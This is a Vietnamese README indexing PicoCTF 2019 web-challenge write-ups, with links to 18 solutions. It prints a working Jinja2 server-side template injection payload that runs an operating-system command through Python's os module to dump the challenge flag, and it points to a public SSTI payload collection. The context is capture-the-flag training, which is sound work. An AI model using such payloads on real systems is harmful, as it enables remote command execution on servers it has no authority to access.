# PicoCTF-2019
---
- 1 chút yêu cầu nho nhỏ cho người đọc bài:
  - Hiểu biết về `Burp suite`, ít thôi, không cần nhiều
  - Biết *view source* và *F12*
  - Phần lớn các tool mình viết ra mình sẽ không giải thích (chủ yếu là python), mình chỉ giải thích về payload. Nếu không hiểu thì có thể *research* để biết thêm. *research* cũng không hiểu có thể post lên nhóm chat hoặc inbox hỏi mình
  - 1 vài tool nhỏ về *javascript* thì mình có dùng cách hơi xàm, nhưng vẫn ra flag. Mình chỉ lấy tool lại lúc mình giải bài này thôi, lúc đó cũng không rảnh mà viết ra 1 cái hoàn chình, thà làm tay còn nhanh hơn. Cũng vì 1 phần kiến thức *javascript* của mình hơi ít nữa
  
- Về các lỗi mà người ra đề đưa ra mình sẽ tổng hợp 1 cách chi tiết nhất có thể nếu có thời gian

- Về phần câu Empire 1 nếu có thời gian mình sẽ giải lại theo cách hay hơn

- Về phần câu Empire 2 và 3 có cách nhanh hơn là dump data trực tiếp. Tuy nhiên cần nhiều kiến thức về flask. Các bạn có thể thử các payload này

- Payload Empire 2: `{{ [].__class__.__base__.__subclasses__()[93].__init__.__globals__["sys"].modules["os"].popen("grep -RI pico .").read() }}`

- Payload Empire 3: `{{ [].__class__.__base__.__subclasses__()[93].__init__.__globals__["sys"].modules["os"].popen("grep -RI pico .").read() }}`

- 2 payload này đều như nhau đó là dump data trực tiếp nhờ tìm kiếm bằng grep thông qua module *sys* và *os* của python. Có thể đây là sơ hở của đề. Ngoài ra payload để dump data trực tiếp còn rất nhiều, có thể tham khảo trong link này: [Link](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)

---
### Mục lục

#### 1. [Insp3ct0r](https://github.com/KaitoRyouga/PicoCTF-2019/tree/master/Insp3ct0r)

#### 2. [dont use client side](https://github.com/KaitoRyouga/PicoCTF-2019/tree/master/dont%20use%20client%20side)

#### 3. [logon](https://github.com/KaitoRyouga/PicoCTF-2019/tree/master/logon)

#### 4. [where are the robots](https://github.com/KaitoRyouga/PicoCTF-2019/tree/master/where%20are%20the%20robots)

#### 5. [Client side again](https://github.com/KaitoRyouga/PicoCTF-2019/tree/master/Client%20side%20again)

#### 6. [Open to admins](https://github.com/KaitoRyouga/PicoCTF-2019/tree/master/Open%20to%20admins)

#### 7. [picobrowser](https://github.com/KaitoRyouga/PicoCTF-2019/tree/master/picobrowser)

#### 8. [Irish Name Repo 1](https://github.com/KaitoRyouga/PicoCTF-2019/tree/master/Irish%20Name%20Repo%201)

#### 9. [Irish Name Repo 2](https://github.com/KaitoRyouga/PicoCTF-2019/tree/master/Irish%20Name%20Repo%202)

#### 10. [Empire 1](https://github.com/KaitoRyouga/PicoCTF-2019/tree/master/Empire%201)

#### 11. [Irish Name Repo 3](https://github.com/KaitoRyouga/PicoCTF-2019/tree/master/Irish%20Name%20Repo%203)

#### 12. [JaWT Scratchpad](https://github.com/KaitoRyouga/PicoCTF-2019/tree/master/JaWT%20Scratchpad)

#### 13. [Java Script Kiddie](https://github.com/KaitoRyouga/PicoCTF-2019/tree/master/Java%20Script%20Kiddie)

#### 14. [Empire 2](https://github.com/KaitoRyouga/PicoCTF-2019/tree/master/Empire%202)

#### 15. [Java Script Kiddie 2](https://github.com/KaitoRyouga/PicoCTF-2019/tree/master/Java%20Script%20Kiddie%202)

#### 16. [cereal hacker 1](https://github.com/KaitoRyouga/PicoCTF-2019/tree/master/cereal%20hacker%201)

#### 17. [Empire 3](https://github.com/KaitoRyouga/PicoCTF-2019/tree/master/Empire%203)

#### 18. [cereal hacker 2](https://github.com/KaitoRyouga/PicoCTF-2019/tree/master/cereal%20hacker%202)
